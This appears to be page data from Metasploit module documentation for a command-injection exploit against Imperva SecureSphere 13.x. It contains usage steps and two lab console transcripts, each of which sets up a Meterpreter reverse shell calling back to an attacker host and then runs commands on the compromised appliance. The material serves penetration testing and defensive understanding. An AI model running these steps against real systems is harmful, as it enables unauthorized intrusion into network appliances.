{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/imperva_securesphere_exec","result":{"data":{"moduleMetadataJson":{"id":"9f11f31c-4d39-5696-9e39-a79c71eb25ee","name":"Imperva SecureSphere PWS Command Injection","fullname":"exploit/linux/http/imperva_securesphere_exec","description":"This module exploits a command injection vulnerability in Imperva\n          SecureSphere 13.x. The vulnerability exists in the PWS service,\n          where Python CGIs didn't properly sanitize user supplied command\n          parameters and directly passes them to corresponding CLI utility,\n          leading to command injection. Agent registration credential is\n          required to exploit SecureSphere in gateway mode.\n\n          This module was successfully tested on Imperva SecureSphere 13.0/13.1/\n          13.2 in pre-ftl mode and unsealed gateway mode.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/imperva_securesphere_exec","documentationSlug":"/modules/documentation/exploit/linux/http/imperva_securesphere_exec","referencesSlug":"/modules/references/exploit/linux/http/imperva_securesphere_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a command injection vulnerability in Imperva SecureSphere 13.x. The vulnerability exists in the PWS service, where Python CGIs didn't properly sanitize user supplied command parameters and directly passes them to corresponding CLI utility, leading to command injection. Agent registration credential is required to exploit SecureSphere in gateway mode.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Imperva SecureSphere 13.0/13.1/13.2</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">use exploit/linux/http/imperva_securesphere_exec</code></li>\n<li><code class=\"language-text\">set RHOST [TARGET IP]</code></li>\n<li><code class=\"language-text\">set PASS [Agent registration password]</code> if the target has been set to gateway mode</li>\n<li>Run <code class=\"language-text\">check</code></li>\n<li>Verify that the result is <code class=\"language-text\">The target is vulnerable.</code></li>\n<li><code class=\"language-text\">set payload linux/x64/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Run <code class=\"language-text\">exploit</code></li>\n<li>Verify that the reverse shell is obtained</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Imperva Secure 13.0 Pre-FTL mode:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/imperva_securesphere_exec\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set RHOST 192.168.146.201\nRHOST =&gt; 192.168.146.201\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; check\n[+] 192.168.146.201:443 The target is vulnerable.\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set LHOST 192.168.146.215\nLHOST =&gt; 192.168.146.215\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; show options\n\nModule options (exploit/linux/http/imperva_securesphere_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASS                        no        Agent registration password\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.146.201  yes       The target address range or CIDR identifier\n   RPORT      443              yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        true             no        Use SSL\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /pws/impcli      no        The URI path to impcli\n   TIMEOUT    3                no        HTTP connection timeout\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   USER       imperva          no        Agent registration username\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.146.215  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Imperva SecureSphere 13.0/13.1/13.2\n\n\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.146.215:4444\n[*] Sending payload linux/x64/meterpreter/reverse_tcp\n[*] Sending stage (816260 bytes) to 192.168.146.201\n[*] Command Stager progress - 100.00% done (1321/1321 bytes)\n\nmeterpreter &gt; sysinfo\nComputer     : localhost.localdomain\nOS           : Red Hat 6.3 (Linux 2.6.32-279.el6.imp8.numa.x86_64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; shell\nProcess 4965 created.\nChannel 1 created.\nid\nuid=497(lighttpd) gid=497(lighttpd) groups=497(lighttpd)\n/sbin/ifconfig\neth0      Link encap:Ethernet  HWaddr 00:0C:29:DE:50:99\n          inet addr:192.168.146.201  Bcast:192.168.146.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fede:5099/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:1331 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:825 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:1790319 (1.7 MiB)  TX bytes:83116 (81.1 KiB)\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0\n          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)\n\nexit\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 192.168.146.201 - Meterpreter session 1 closed.  Reason: User exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Imperva SecureSphere 13.0 Gateway mode (Requires agent registration credential):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/imperva_securesphere_exec\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set RHOST 192.168.146.201\nRHOST =&gt; 192.168.146.201\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set PASS lshy5782%lsLS\nPASS =&gt; lshy5782%lsLS\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; check\n[+] 192.168.146.201:443 The target is vulnerable.\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; set LHOST 192.168.146.215\nLHOST =&gt; 192.168.146.215\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; show options\n\nModule options (exploit/linux/http/imperva_securesphere_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASS       lshy5782%lsLS    no        Agent registration password\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.146.201  yes       The target address range or CIDR identifier\n   RPORT      443              yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        true             no        Use SSL\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /pws/impcli      no        The URI path to impcli\n   TIMEOUT    3                no        HTTP connection timeout\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   USER       imperva          no        Agent registration username\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.146.215  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Imperva SecureSphere 13.0/13.1/13.2\n\n\nmsf5 exploit(linux/http/imperva_securesphere_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.146.215:4444\n[*] Sending payload linux/x64/meterpreter/reverse_tcp\n[*] Sending stage (816260 bytes) to 192.168.146.201\n[*] Command Stager progress - 100.00% done (1321/1321 bytes)\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.146.201\nOS           : Red Hat 6.3 (Linux 2.6.32-279.el6.imp8.numa.x86_64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; shell\nProcess 19634 created.\nChannel 1 created.\nid\nuid=497(lighttpd) gid=497(lighttpd) groups=497(lighttpd)\n/sbin/ifconfig\neth0      Link encap:Ethernet  HWaddr 00:0C:29:DE:50:99\n          inet addr:192.168.146.201  Bcast:192.168.146.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fede:5099/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:651 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:451 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:894174 (873.2 KiB)  TX bytes:37181 (36.3 KiB)\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:153 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:153 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0\n          RX bytes:21579 (21.0 KiB)  TX bytes:21579 (21.0 KiB)\n\nexit\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 192.168.146.201 - Meterpreter session 1 closed.  Reason: User exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9f11f31c-4d39-5696-9e39-a79c71eb25ee"}}}